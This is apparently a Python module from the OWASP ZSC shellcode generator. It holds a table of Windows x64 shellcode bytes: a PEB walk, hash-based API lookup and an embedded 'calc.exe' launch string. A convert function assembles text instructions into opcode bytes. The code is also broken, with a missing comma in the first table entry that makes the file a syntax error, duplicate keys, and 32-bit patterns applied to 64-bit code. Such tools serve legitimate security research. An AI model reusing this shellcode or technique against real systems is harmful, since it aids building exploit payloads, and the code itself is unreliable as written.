#!/usr/bin/env python
'''
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
'''
import binascii
from core import stack
from core import color
from core.alert import info
from core.compatible import version
_version = version()
replace_values_static = {"48 83 ec 20         " :   "sub    $0x20,%rsp"
  "48 83 e4 f0         " :   "and    $0xfffffffffffffff0,%rsp"
  ,"65 4c 8b 24 25 60 00" :   "mov    %gs:0x60,%r12"
  ,"4d 8b 64 24 18      " :   "mov    0x18(%r12),%r12"
  ,"4d 8b 64 24 20      " :   "mov    0x20(%r12),%r12"
  ,"4d 8b 24 24         " :   "mov    (%r12),%r12"
  ,"4d 8b 7c 24 20      " :   "mov    0x20(%r12),%r15"
  ,"4d 8b 24 24         " :   "mov    (%r12),%r12"
  ,"4d 8b 64 24 20      " :   "mov    0x20(%r12),%r12"
  ,"ba 98 fe 8a 0e      " :   "mov    $0xe8afe98,%edx"
  ,"4c 89 e1            " :   "mov    %r12,%rcx"
  ,"4d 89 e4            " :   "mov    %r12,%r12"
  ,"e8 2a 00 00 00      " :   "callq  0x401067"
  ,"eb 1a               " :   "jmp    0x401059"
  ,"59                  " :   "pop    %rcx"
  ,"ba 01 00 00 00      " :   "mov    $0x1,%edx"
  ,"ff d0               " :   "callq  *%rax"
  ,"ba 70 cd 3f 2d      " :   "mov    $0x2d3fcd70,%edx"
  ,"4c 89 f9            " :   "mov    %r15,%rcx"
  ,"e8 13 00 00 00      " :   "callq  0x401067"
  ,"48 31 c9            " :   "xor    %rcx,%rcx"
  ,"ff d0               " :   "callq  *%rax"
  ,"e8 e1 ff ff ff      " :   "callq  0x40103f"
  ,"63 61 6c            " :   "movslq 0x6c(%rcx),%esp"
  ,"63 2e               " :   "movslq (%rsi),%ebp"
  ,"65 78 65            " :   "gs js  0x4010cb"
  ,"00 49 89            " :   "add    %cl,-0x77(%rcx)"
  ,"cd 67               " :   "int    $0x67"
  ,"41 8b 45 3c         " :   "mov    0x3c(%r13),%eax"
  ,"67 45 8b b4 05 88 00" :   "mov    0x88(%r13d,%eax,1),%r14d"
  ,"45 01 ee            " :   "add    %r13d,%r14d"
  ,"67 45 8b 56 18      " :   "mov    0x18(%r14d),%r10d"
  ,"67 41 8b 5e 20      " :   "mov    0x20(%r14d),%ebx"
  ,"44 01 eb            " :   "add    %r13d,%ebx"
  ,"67 e3 3f            " :   "jecxz  0x4010ca"
  ,"41 ff ca            " :   "dec    %r10d"
  ,"67 42 8b 34 93      " :   "mov    (%ebx,%r10d,4),%esi"
  ,"44 01 ee            " :   "add    %r13d,%esi"
  ,"31 ff               " :   "xor    %edi,%edi"
  ,"31 c0               " :   "xor    %eax,%eax"
  ,"fc                  " :   "cld"
  ,"ac                  " :   "lods   %ds:(%rsi),%al"
  ,"84 c0               " :   "test   %al,%al"
  ,"74 07               " :   "je     0x4010a7"
  ,"c1 cf 0d            " :   "ror    $0xd,%edi"
  ,"01 c7               " :   "add    %eax,%edi"
  ,"eb f4               " :   "jmp    0x40109b"
  ,"39 d7               " :   "cmp    %edx,%edi"
  ,"75 dd               " :   "jne    0x401088"
  ,"67 41 8b 5e 24      " :   "mov    0x24(%r14d),%ebx"
  ,"44 01 eb            " :   "add    %r13d,%ebx"
  ,"31 c9               " :   "xor    %ecx,%ecx"
  ,"66 67 42 8b 0c 53   " :   "mov    (%ebx,%r10d,2),%cx"
  ,"67 41 8b 5e 1c      " :   "mov    0x1c(%r14d),%ebx"
  ,"44 01 eb            " :   "add    %r13d,%ebx"
  ,"67 8b 04 8b         " :   "mov    (%ebx,%ecx,4),%eax"
  ,"44 01 e8            " :   "add    %r13d,%eax"
  ,"c3                  " :   "retq",
  }


def convert(shellcode):
	shellcode = shellcode.replace('\n\n','\n').replace('\n\n','\n').replace('    ',' ').replace('   ',' ').replace('	',' ')
	for data in replace_values_static:
		shellcode = shellcode.replace(data,replace_values_static[data])

	new_shellcode = shellcode.rsplit('\n')
	last = 0
	for line in new_shellcode:
		if 'push $0x' in line:
			if len(line) is 15:
				if _version is 2:
					rep = str('68') + stack.st(str(binascii.a2b_hex(str('0') + str(line.rsplit('$0x')[1]))))
				if _version is 3:
					rep = str('68') + stack.st(str(binascii.a2b_hex(str('0') + line.rsplit('$0x')[1].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)
			if len(line) is 16:
				if _version is 2:
					rep = str('68') + stack.st(str(binascii.a2b_hex(str(line.rsplit('$0x')[1]))))
				if _version is 3:
					rep = str('68') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)

		if 'mov $0x' in line:
			if '%ecx' in line.rsplit(',')[1]:
				if _version is 2:
					rep = str('b9') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0])))
				if _version is 3:
					rep = str('b9') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)

		if 'mov 0x' in line:
			if '%eax' in line.rsplit(',')[0] and '%eax' in line.rsplit(',')[1]:
				rep = str('8b 40') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)
			if '%eax' in line.rsplit(',')[0] and '%esi' in line.rsplit(',')[1]:
				rep = str('8b 70') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)
			if '%eax' in line.rsplit(',')[0] and '%ebx' in line.rsplit(',')[1]:
				rep = str('8b 58') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)
			if '%ebx' in line.rsplit(',')[0] and '%edx' in line.rsplit(',')[1]:
				rep = str('8b 53') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)
			if '%edx' in line.rsplit(',')[0] and '%edx' in line.rsplit(',')[1]:
				rep = str('8b 52') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)
			if '%edx' in line.rsplit(',')[0] and '%esi' in line.rsplit(',')[1]:
				rep = str('8b 72') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)

		if 'mov $0x' in line and len(line.rsplit('$0x')[1].rsplit(',')[0]) == 4:
			if '%cx' in line:
				if _version is 2:
					rep = str('66 b9') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0])))
				if _version is 3:
					rep = str('66 b9') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)
			if '%dx' in line:
				if _version is 2:
					rep = str('66 ba') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0])))
				if _version is 3:
					rep = str('66 ba') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)

		if 'add' in line:
			if '$0x' in line:
				if '%esp' in line.rsplit(',')[1]:
					if _version is 2:
						rep = str('83 c4') + stack.st(str(binascii.a2b_hex(stack.toHex(line.rsplit('$0x')[1].rsplit(',')[0]))))
					if _version is 3:
						rep = str('83 c4') + stack.st(str(binascii.a2b_hex(stack.toHex(line.rsplit('$0x')[1].rsplit(',')[0]).encode('latin-1')).decode('latin-1')))
					shellcode = shellcode.replace(line,rep)

		if 'cmpl' in line:
			if '(%eax)' == line.rsplit(',')[1]:
				if _version is 2:
					rep = str('81 38') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0])))
				if _version is 3:
					rep = str('81 38') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)
			if '0x' in line.rsplit(',')[1]:
				if '%eax' in line:
					if _version is 2:
						rep = str('81 78') + stack.st(str(binascii.a2b_hex(stack.toHex(line.rsplit(',0x')[1].rsplit('(')[0])))) + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0])))
					if _version is 3:
						rep = str('81 78') + stack.st(str(binascii.a2b_hex(stack.toHex(line.rsplit(',0x')[1].rsplit('(')[0]).encode('latin-1')).decode('latin-1'))) + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0].encode('latin-1')).decode('latin-1')))
					shellcode = shellcode.replace(line,rep)

		if 'jne' in line:
			rep = str('75') + hex(int('f4', 16) - last*9)[2:]
			shellcode = shellcode.replace(line,rep,1)
			last += 1
	shellcode = stack.shellcoder(shellcode.replace('\n','').replace(' ',''))
	return shellcode

